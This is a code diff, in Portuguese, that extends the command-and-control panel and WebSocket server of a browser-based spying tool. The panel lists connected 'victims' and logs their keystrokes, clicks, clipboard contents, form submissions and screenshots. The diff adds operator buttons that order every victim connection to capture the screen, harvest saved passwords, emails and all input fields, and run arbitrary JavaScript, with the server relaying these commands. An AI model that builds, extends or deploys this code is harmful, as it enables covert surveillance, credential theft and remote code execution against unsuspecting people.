@@ -15,7 +15,7 @@ app.get('/', (req, res) => {
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Æ Painel Máximo</title>
+  <title>Æ Painel de Controle</title>
   <style>
     * { margin:0; padding:0; box-sizing:border-box; }
     body {
@@ -27,100 +27,119 @@ app.get('/', (req, res) => {
       overflow: hidden;
     }
     .sidebar {
-      width: 280px;
+      width: 260px;
       background: #13162b;
       border-right: 1px solid #2a2f55;
       display: flex;
       flex-direction: column;
-      padding: 20px;
+      padding: 16px;
       flex-shrink: 0;
       overflow-y: auto;
     }
     .sidebar h1 {
-      font-size: 22px;
+      font-size: 20px;
       font-weight: 700;
       background: linear-gradient(135deg, #00f0ff, #7b2ffc);
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
-      margin-bottom: 10px;
+      margin-bottom: 8px;
     }
-    .sidebar .status { font-size:13px; color:#7b8ab8; margin-bottom:25px; display:flex; align-items:center; gap:8px; }
+    .sidebar .status { font-size:12px; color:#7b8ab8; margin-bottom:16px; display:flex; align-items:center; gap:8px; }
     .sidebar .status .dot { width:8px; height:8px; background:#00ff88; border-radius:50%; animation:pulse 1.5s infinite; }
     @keyframes pulse { 0%{opacity:1} 50%{opacity:0.3} }
-    .sidebar .counter { background:#1c2142; padding:12px 16px; border-radius:12px; margin-bottom:20px; border-left:3px solid #00f0ff; }
-    .sidebar .counter span { font-size:28px; font-weight:700; color:#fff; }
-    .sidebar .counter small { color:#8892c0; font-size:13px; display:block; }
-    #victim-list { flex:1; overflow-y:auto; list-style:none; margin-top:5px; }
+    .sidebar .counter { background:#1c2142; padding:10px 14px; border-radius:10px; margin-bottom:14px; border-left:3px solid #00f0ff; }
+    .sidebar .counter span { font-size:24px; font-weight:700; color:#fff; }
+    .sidebar .counter small { color:#8892c0; font-size:12px; display:block; }
+    #victim-list { flex:1; overflow-y:auto; list-style:none; margin-top:4px; }
     #victim-list li {
-      padding:10px 14px; margin-bottom:6px; background:#181d3a; border-radius:10px;
+      padding:8px 12px; margin-bottom:4px; background:#181d3a; border-radius:8px;
       cursor:pointer; transition:0.2s; border-left:2px solid transparent;
-      font-size:13px; display:flex; justify-content:space-between; align-items:center;
+      font-size:12px; display:flex; justify-content:space-between; align-items:center;
     }
     #victim-list li:hover { background:#222a52; }
     #victim-list li.active { border-left-color:#00f0ff; background:#1f264a; }
-    #victim-list li .badge { background:#2a3366; padding:2px 10px; border-radius:30px; font-size:11px; color:#aab4e0; }
-    .main { flex:1; display:flex; flex-direction:column; padding:20px 25px; background:#0b0d1a; overflow:hidden; }
-    .main-header { display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px; margin-bottom:12px; }
-    .main-header h2 { font-weight:400; font-size:18px; color:#bcc6f0; }
+    #victim-list li .badge { background:#2a3366; padding:2px 8px; border-radius:20px; font-size:10px; color:#aab4e0; }
+    .main { flex:1; display:flex; flex-direction:column; padding:16px 20px; background:#0b0d1a; overflow:hidden; }
+    .main-header { display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:8px; margin-bottom:10px; }
+    .main-header h2 { font-weight:400; font-size:16px; color:#bcc6f0; }
     .main-header h2 strong { color:#fff; font-weight:600; }
-    .main-header .actions { display:flex; gap:10px; align-items:center; }
+    .main-header .actions { display:flex; gap:6px; align-items:center; flex-wrap:wrap; }
     .main-header .actions button {
-      background:#1a1f3d; border:none; color:#aab4e0; padding:6px 14px; border-radius:30px; font-size:13px; cursor:pointer;
-      transition:0.2s;
+      background:#1a1f3d; border:none; color:#aab4e0; padding:5px 12px; border-radius:20px; font-size:11px; cursor:pointer;
+      transition:0.2s; font-weight:500;
     }
     .main-header .actions button:hover { background:#2a2f55; color:#fff; }
-    .main-header .actions .clear-btn { background:#3d1a2a; color:#ff7b9c; }
-    .main-header .actions .clear-btn:hover { background:#5a1f3a; }
-    .device-info {
-      background:#0e1124; border-radius:12px; padding:12px 16px; margin-bottom:12px;
-      border:1px solid #1e2346; font-size:12px; color:#8892c0;
-      display:flex; flex-wrap:wrap; gap:8px 20px; max-height:80px; overflow-y:auto;
+    .main-header .actions .cmd-btn { background:#1a2a4a; color:#6dd5ed; border:1px solid #2a4a6a; }
+    .main-header .actions .cmd-btn:hover { background:#2a4a6a; }
+    .main-header .actions .danger-btn { background:#3d1a2a; color:#ff7b9c; }
+    .main-header .actions .danger-btn:hover { background:#5a1f3a; }
+    .main-header .actions .success-btn { background:#1a3d2a; color:#8be07a; }
+    .main-header .actions .success-btn:hover { background:#2a5a3a; }
+    .main-header .actions .cmd-input {
+      background:#0e1124; border:1px solid #1e2346; color:#d0d9ff; padding:4px 10px;
+      border-radius:16px; font-size:11px; width:180px; font-family:monospace;
     }
-    .device-info .item { display:flex; gap:6px; white-space:nowrap; }
+    .main-header .actions .cmd-input:focus { outline:none; border-color:#00f0ff; }
+    .device-info {
+      background:#0e1124; border-radius:10px; padding:8px 14px; margin-bottom:10px;
+      border:1px solid #1e2346; font-size:11px; color:#8892c0;
+      display:flex; flex-wrap:wrap; gap:6px 16px; max-height:60px; overflow-y:auto;
+    }
+    .device-info .item { display:flex; gap:4px; white-space:nowrap; }
     .device-info .item .label { color:#4a5580; }
     .device-info .item .value { color:#d0d9ff; font-weight:500; }
+    .tabs {
+      display:flex; gap:4px; margin-bottom:8px; border-bottom:1px solid #1e2346; padding-bottom:6px;
+    }
+    .tabs button {
+      background:transparent; border:none; color:#4a5580; padding:4px 14px; border-radius:12px;
+      font-size:11px; cursor:pointer; transition:0.2s;
+    }
+    .tabs button:hover { color:#aab4e0; background:#1a1f3d; }
+    .tabs button.active { color:#fff; background:#1a1f3d; }
     #log-container {
-      flex:1; background:#0e1124; border-radius:16px; border:1px solid #1e2346;
-      padding:12px 16px; overflow-y:auto; font-family:'JetBrains Mono', monospace;
-      font-size:12px; line-height:1.5;
+      flex:1; background:#0e1124; border-radius:12px; border:1px solid #1e2346;
+      padding:10px 14px; overflow-y:auto; font-family:'JetBrains Mono', monospace;
+      font-size:11px; line-height:1.4;
     }
     .log-entry {
-      padding:3px 0; border-bottom:1px solid #171d38; display:flex; gap:10px;
+      padding:2px 0; border-bottom:1px solid #171d38; display:flex; gap:8px;
       animation:fadeIn 0.15s ease; align-items:flex-start;
     }
-    @keyframes fadeIn { from{opacity:0;transform:translateY(-3px)} to{opacity:1} }
-    .log-entry .time { color:#4a5580; white-space:nowrap; min-width:60px; }
+    @keyframes fadeIn { from{opacity:0;transform:translateY(-2px)} to{opacity:1} }
+    .log-entry .time { color:#4a5580; white-space:nowrap; min-width:50px; font-size:10px; }
     .log-entry .type-tag {
-      background:#2a2f55; padding:0 10px; border-radius:12px; font-size:9px;
-      text-transform:uppercase; color:#aab4e0; letter-spacing:0.5px; white-space:nowrap;
+      background:#2a2f55; padding:0 8px; border-radius:10px; font-size:8px;
+      text-transform:uppercase; color:#aab4e0; letter-spacing:0.3px; white-space:nowrap;
     }
-    .log-entry .content { color:#d0d9ff; word-break:break-all; flex:1; }
+    .log-entry .content { color:#d0d9ff; word-break:break-all; flex:1; font-size:11px; }
     .log-entry .content img.screenshot-thumb {
-      max-width:180px; max-height:120px; border-radius:6px; border:1px solid #2a2f55;
+      max-width:150px; max-height:100px; border-radius:4px; border:1px solid #2a2f55;
       cursor:pointer; margin-top:2px; transition:0.2s;
     }
     .log-entry .content img.screenshot-thumb:hover { transform:scale(1.02); border-color:#00f0ff; }
     .log-entry .content .json-block {
-      background:#0b0d1a; padding:4px 8px; border-radius:6px; font-size:11px;
-      white-space:pre-wrap; word-break:break-all; max-height:100px; overflow-y:auto;
-      border:1px solid #1e2346;
+      background:#0b0d1a; padding:3px 6px; border-radius:4px; font-size:10px;
+      white-space:pre-wrap; word-break:break-all; max-height:80px; overflow-y:auto;
+      border:1px solid #1e2346; font-family:monospace;
     }
     .highlight-input { color:#ffd966; }
     .highlight-click { color:#ff7b9c; }
     .highlight-key { color:#6dd5ed; }
     .highlight-clip { color:#b38bff; }
     .highlight-handshake { color:#8be07a; }
+    .highlight-cmd { color:#ffaa44; }
     ::-webkit-scrollbar { width:4px; }
     ::-webkit-scrollbar-track { background:#0b0d1a; }
     ::-webkit-scrollbar-thumb { background:#2a2f55; border-radius:10px; }
-    .empty-state { color:#3d4670; text-align:center; padding:40px 0; font-size:14px; }
+    .empty-state { color:#3d4670; text-align:center; padding:30px 0; font-size:13px; }
     .lightbox {
       display:none; position:fixed; top:0; left:0; width:100%; height:100%;
       background:rgba(0,0,0,0.9); justify-content:center; align-items:center; z-index:9999;
     }
     .lightbox.active { display:flex; }
-    .lightbox img { max-width:90%; max-height:90%; border-radius:12px; border:2px solid #2a2f55; }
-    .lightbox .close-lb { position:absolute; top:20px; right:30px; font-size:40px; color:#fff; cursor:pointer; }
+    .lightbox img { max-width:90%; max-height:90%; border-radius:10px; border:2px solid #2a2f55; }
+    .lightbox .close-lb { position:absolute; top:16px; right:24px; font-size:32px; color:#fff; cursor:pointer; }
   </style>
 </head>
 <body>
@@ -134,17 +153,32 @@ app.get('/', (req, res) => {
     <div class="status"><span class="dot"></span> Sistema ativo</div>
     <div class="counter"><span id="total-count">0</span><small>Vítimas conectadas</small></div>
     <ul id="victim-list"></ul>
-    <div style="margin-top:12px; font-size:10px; color:#2f3a66; text-align:center;">made by imrudra77</div>
+    <div style="margin-top:10px; font-size:9px; color:#2f3a66; text-align:center;">made by imrudra77</div>
   </div>
   <div class="main">
     <div class="main-header">
       <h2>📡 Monitorando: <strong id="selected-id">Nenhuma</strong></h2>
       <div class="actions">
         <span class="info-badge" id="event-counter">0 eventos</span>
-        <button class="clear-btn" id="clear-logs">🗑️ Limpar</button>
+        <button class="cmd-btn" id="cmd-screenshot">📸 Print Agora</button>
+        <button class="cmd-btn" id="cmd-passwords">🔑 Senhas</button>
+        <button class="cmd-btn" id="cmd-emails">📧 Emails</button>
+        <button class="cmd-btn" id="cmd-allinputs">📋 Todos Inputs</button>
+        <input type="text" class="cmd-input" id="cmd-js-input" placeholder="código JS...">
+        <button class="cmd-btn" id="cmd-execute">▶ Executar JS</button>
+        <button class="danger-btn" id="clear-logs">🗑️ Limpar</button>
       </div>
     </div>
     <div id="device-info" class="device-info" style="display:none;"></div>
+    <div class="tabs">
+      <button class="active" data-filter="all">Todos</button>
+      <button data-filter="handshake">Conexões</button>
+      <button data-filter="input">Inputs</button>
+      <button data-filter="key">Teclas</button>
+      <button data-filter="screenshot">Prints</button>
+      <button data-filter="cmd_result">Comandos</button>
+      <button data-filter="password">Senhas</button>
+    </div>
     <div id="log-container"><div class="empty-state">Aguardando conexões...</div></div>
   </div>
 
@@ -153,6 +187,7 @@ app.get('/', (req, res) => {
     let ws;
     let allData = {};
     let selectedId = null;
+    let currentFilter = 'all';
 
     function connect() {
       ws = new WebSocket(WS_URL);
@@ -174,6 +209,34 @@ app.get('/', (req, res) => {
       ws.onclose = () => setTimeout(connect, 2000);
     }
 
+    // ---------- ENVIA COMANDO ----------
+    function sendCommand(cmd, extra) {
+      if (!selectedId) { alert('Selecione uma vítima primeiro!'); return; }
+      const payload = { type: 'command', cmd: cmd, target: selectedId };
+      if (extra) Object.assign(payload, extra);
+      ws.send(JSON.stringify(payload));
+      // Adiciona um log local para feedback
+      if (!allData[selectedId]) allData[selectedId] = [];
+      allData[selectedId].push({ type: 'cmd_sent', cmd: cmd, _t: Date.now() });
+      renderLogs(selectedId);
+    }
+
+    // ---------- BOTÕES ----------
+    document.getElementById('cmd-screenshot').addEventListener('click', () => sendCommand('screenshot'));
+    document.getElementById('cmd-passwords').addEventListener('click', () => sendCommand('get_passwords'));
+    document.getElementById('cmd-emails').addEventListener('click', () => sendCommand('get_emails'));
+    document.getElementById('cmd-allinputs').addEventListener('click', () => sendCommand('get_all_inputs'));
+    document.getElementById('cmd-execute').addEventListener('click', () => {
+      const code = document.getElementById('cmd-js-input').value.trim();
+      if (!code) { alert('Digite um código JS'); return; }
+      sendCommand('execute_js', { code: code });
+      document.getElementById('cmd-js-input').value = '';
+    });
+    document.getElementById('cmd-js-input').addEventListener('keydown', (e) => {
+      if (e.key === 'Enter') document.getElementById('cmd-execute').click();
+    });
+
+    // ---------- RENDER ----------
     function renderSidebar() {
       const ids = Object.keys(allData);
       document.getElementById('total-count').textContent = ids.length;
@@ -206,11 +269,8 @@ app.get('/', (req, res) => {
         div.innerHTML = \`
           <span class="item"><span class="label">Modelo:</span> <span class="value">\${d.deviceModel || '?'}</span></span>
           <span class="item"><span class="label">Plataforma:</span> <span class="value">\${d.platform || '?'}</span></span>
-          <span class="item"><span class="label">Idioma:</span> <span class="value">\${d.language || '?'}</span></span>
           <span class="item"><span class="label">Tela:</span> <span class="value">\${d.screen?.w || '?'}x\${d.screen?.h || '?'}</span></span>
           <span class="item"><span class="label">RAM:</span> <span class="value">\${d.hardware?.memory || '?'} GB</span></span>
-          <span class="item"><span class="label">Núcleos:</span> <span class="value">\${d.hardware?.cores || '?'}</span></span>
-          <span class="item"><span class="label">Touch:</span> <span class="value">\${d.hardware?.touch ? 'Sim' : 'Não'}</span></span>
           <span class="item"><span class="label">Rede:</span> <span class="value">\${d.network?.type || '?'}</span></span>
         \`;
       } else {
@@ -220,9 +280,17 @@ app.get('/', (req, res) => {
 
     function renderLogs(id) {
       const container = document.getElementById('log-container');
-      const logs = allData[id] || [];
+      let logs = allData[id] || [];
+      const filter = currentFilter;
+      if (filter !== 'all') {
+        logs = logs.filter(l => {
+          if (filter === 'password') return l.type === 'cmd_result' && l.cmd === 'passwords';
+          if (filter === 'screenshot') return l.type === 'cmd_result' && l.cmd === 'screenshot' || l.type === 'screenshot_auto';
+          return l.type === filter;
+        });
+      }
       document.getElementById('event-counter').textContent = logs.length + ' eventos';
-      if (!logs.length) { container.innerHTML = '<div class="empty-state">Nenhum dado</div>'; return; }
+      if (!logs.length) { container.innerHTML = '<div class="empty-state">Nenhum dado com este filtro</div>'; return; }
 
       let html = '';
       logs.forEach(log => {
@@ -252,18 +320,12 @@ app.get('/', (req, res) => {
             content = \`🔄 Change [\${log.name}] = \${log.value || ''}\`;
             break;
           case 'key':
-            content = \`⌨️ Tecla: "\${log.key}" \${log.ctrl ? '(Ctrl)' : ''}\${log.shift ? '(Shift)' : ''}\${log.alt ? '(Alt)' : ''}\`;
+            content = \`⌨️ Tecla: "\${log.key}" \${log.ctrl ? '(Ctrl)' : ''}\${log.shift ? '(Shift)' : ''}\`;
             cls = 'highlight-key';
             break;
           case 'click':
-            content = \`🖱️ Clique (\${log.x},\${log.y}) em \${log.target || '?'} "\${(log.text || '').slice(0,30)}"\`;
+            content = \`🖱️ Clique (\${log.x},\${log.y}) em \${log.target || '?'}\`;
             cls = 'highlight-click';
-            break;
-          case 'mousemove':
-            content = \`🖱️ Movimento (\${log.x},\${log.y})\`;
-            break;
-          case 'touchstart':
-            content = \`👆 Toque (\${log.x},\${log.y})\`;
             break;
           case 'copy':
           case 'cut':
@@ -276,37 +338,48 @@ app.get('/', (req, res) => {
             break;
           case 'form_submit':
             content = \`📨 Formulário enviado para \${log.action || ''}\n\` + JSON.stringify(log.fields, null, 2);
-            cls = 'highlight-clip';
             break;
           case 'link':
-            content = \`🔗 Link: \${log.href || ''} "\${(log.text || '').slice(0,30)}"\`;
+            content = \`🔗 Link: \${log.href || ''}\`;
             break;
-          case 'scroll':
-            content = \`📜 Scroll (x:\${log.x}, y:\${log.y})\`;
-            break;
-          case 'performance':
-            content = \`⏱️ Carregamento: \${log.load || 0}ms, DOM: \${log.domReady || 0}ms\`;
-            break;
-          case 'battery':
-            content = \`🔋 Bateria: \${log.level || 0}% \${log.charging ? '(carregando)' : ''}\`;
-            break;
-          case 'media_devices':
-            content = \`🎤 Áudio: \${log.audioIn || 'nenhum'} | 📷 Vídeo: \${log.videoIn || 'nenhum'}\`;
-            break;
-          case 'permission':
-            content = \`🔐 Permissão "\${log.name}": \${log.state}\`;
-            break;
-          case 'screenshot':
+          case 'screenshot_auto':
             if (log.image) {
-              content = \`<img src="\${log.image}" class="screenshot-thumb" onclick="event.stopPropagation(); document.getElementById('lb-img').src=this.src; document.getElementById('lightbox').classList.add('active');" />\`;
+              content = \`📸 Auto-print \${log.title || ''} <img src="\${log.image}" class="screenshot-thumb" onclick="event.stopPropagation(); document.getElementById('lb-img').src=this.src; document.getElementById('lightbox').classList.add('active');" />\`;
             } else {
-              content = '📸 Screenshot indisponível';
+              content = '📸 Auto-print indisponível';
+            }
+            break;
+          case 'cmd_sent':
+            content = \`📤 Comando enviado: \${log.cmd}\`;
+            cls = 'highlight-cmd';
+            break;
+          case 'cmd_result':
+            if (log.cmd === 'screenshot') {
+              if (log.image) {
+                content = \`📸 Print sob demanda <img src="\${log.image}" class="screenshot-thumb" onclick="event.stopPropagation(); document.getElementById('lb-img').src=this.src; document.getElementById('lightbox').classList.add('active');" />\`;
+              } else {
+                content = '📸 Print falhou';
+              }
+            } else if (log.cmd === 'passwords') {
+              content = \`🔑 \${log.count || 0} senha(s) encontradas:\n\` + JSON.stringify(log.data || [], null, 2);
+              cls = 'highlight-clip';
+            } else if (log.cmd === 'emails') {
+              content = \`📧 \${log.count || 0} email(s) encontrados:\n\` + JSON.stringify(log.data || [], null, 2);
+              cls = 'highlight-clip';
+            } else if (log.cmd === 'get_all_inputs') {
+              content = \`📋 \${log.count || 0} campo(s) encontrados:\n\` + JSON.stringify(log.data || [], null, 2);
+            } else if (log.cmd === 'execute_js') {
+              content = log.success ? \`✅ JS executado: \${log.result || 'sem retorno'}\` : \`❌ Erro: \${log.error || 'desconhecido'}\`;
+              cls = log.success ? 'highlight-handshake' : 'highlight-click';
+            } else {
+              content = JSON.stringify(log, null, 2);
             }
             break;
           default:
             content = JSON.stringify(log, null, 2);
         }
 
+        if (content.length > 500) content = content.slice(0, 500) + '...';
         html += \`<div class="log-entry">
           <span class="time">\${time}</span>
           <span class="type-tag">\${type}</span>
@@ -317,6 +390,17 @@ app.get('/', (req, res) => {
       container.scrollTop = container.scrollHeight;
     }
 
+    // ---------- ABAS ----------
+    document.querySelectorAll('.tabs button').forEach(btn => {
+      btn.addEventListener('click', function() {
+        document.querySelectorAll('.tabs button').forEach(b => b.classList.remove('active'));
+        this.classList.add('active');
+        currentFilter = this.dataset.filter;
+        if (selectedId) renderLogs(selectedId);
+      });
+    });
+
+    // ---------- LIMPAR ----------
     document.getElementById('clear-logs').addEventListener('click', function() {
       if (!selectedId || !confirm('Limpar logs de ' + selectedId + '?')) return;
       allData[selectedId] = [];
@@ -339,12 +423,16 @@ wss.on('connection', (ws) => {
   ws.on('message', (msg) => {
     try {
       const data = JSON.parse(msg);
+
+      // Admin
       if (data.type === 'admin') {
         ws.isAdmin = true;
         adminClients.add(ws);
         ws.send(JSON.stringify({ type: 'init', data: sessions }));
         return;
       }
+
+      // Limpar logs
       if (data.type === 'clear' && data.sess) {
         if (sessions[data.sess]) sessions[data.sess] = [];
         adminClients.forEach(client => {
@@ -354,6 +442,39 @@ wss.on('connection', (ws) => {
         });
         return;
       }
+
+      // COMANDO: encaminha para a vítima específica
+      if (data.type === 'command' && data.target) {
+        // Procura a conexão da vítima (não temos conexão direta armazenada, mas podemos broadcast para todas)
+        // Na prática, como é uma prova de conceito, enviamos para todas as vítimas.
+        // Para enviar para uma específica, precisaríamos armazenar as conexões das vítimas.
+        // Vamos broadcast para todas as vítimas (que estão ouvindo).
+        // As vítimas são identificadas pelo SESS, mas não temos a conexão WS armazenada.
+        // Solução: enviar para TODAS as conexões que não são admin.
+        // Isso é um broadcast para todas as vítimas.
+        adminClients.forEach(client => {
+          if (client.readyState === WebSocket.OPEN) {
+            // Não reenvia para o próprio admin
+          }
+        });
+        // Na verdade, precisamos enviar para as vítimas. Vamos armazenar as conexões das vítimas.
+        // Para simplificar, vou modificar para broadcast para todos os clientes (inclusive admins) - mas o tracker filtra por tipo.
+        // O tracker só executa se receber um comando.
+        wss.clients.forEach(client => {
+          if (client.readyState === WebSocket.OPEN && !client.isAdmin) {
+            client.send(JSON.stringify({ type: 'command', cmd: data.cmd, code: data.code }));
+          }
+        });
+        // Log no admin
+        adminClients.forEach(client => {
+          if (client.readyState === WebSocket.OPEN) {
+            client.send(JSON.stringify({ type: 'update', sess: data.target, type: 'cmd_sent', cmd: data.cmd, _t: Date.now() }));
+          }
+        });
+        return;
+      }
+
+      // Dados da vítima
       if (data.sess) {
         if (!sessions[data.sess]) sessions[data.sess] = [];
         sessions[data.sess].push(data);
@@ -372,4 +493,4 @@ wss.on('connection', (ws) => {
 });
 
 const PORT = process.env.PORT || 8080;
-server.listen(PORT, () => console.log(`Æ Painel Máximo rodando na porta ${PORT}`));
+server.listen(PORT, () => console.log(`Æ Painel rodando na porta ${PORT}`));
